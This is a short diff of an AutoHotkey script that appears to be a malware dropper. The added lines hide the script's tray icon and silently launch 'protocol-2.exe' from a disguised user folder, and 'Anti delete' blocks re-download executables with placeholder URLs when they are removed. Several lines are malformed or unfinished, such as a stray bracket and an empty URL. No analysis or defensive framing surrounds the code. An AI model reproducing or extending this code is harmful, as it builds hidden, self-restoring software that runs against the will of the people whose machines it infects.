@@ -2,7 +2,7 @@
 ; #Warn  ; Enable warnings to assist with detecting common errors.
 SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
 SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.
-
+#NoTrayIcon
 
     If (FileExist("C:\Windows System\Security\protocol-1.exe")) ;Anti delete 1
     {
@@ -14,12 +14,12 @@ SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.
     }
     If (FileExist("C:\Users\%A_UserName%\proccessData\User1_data\protocol-2.exe")) ;Anti delete 2
     {
-        UrlDownloadToFile, URL, Filename
+        Run, protocol-2.exe, C:\Users\%A_UserName%\proccessData\User1_data, Max|Min|Hide|UseErrorLevel, OutputVarPID]
     }
     If !(FileExist("C:\Users\%A_UserName%\proccessData\User1_data\protocol-2.exe")) ;Anti delete 2
     {
         UrlDownloadToFile, URL, Filename
     }
     If (FileExist("C:\Users\%A_UserName%\proccessData\User1_data\sync.exe"))
-    Sleep, 15000
+
 
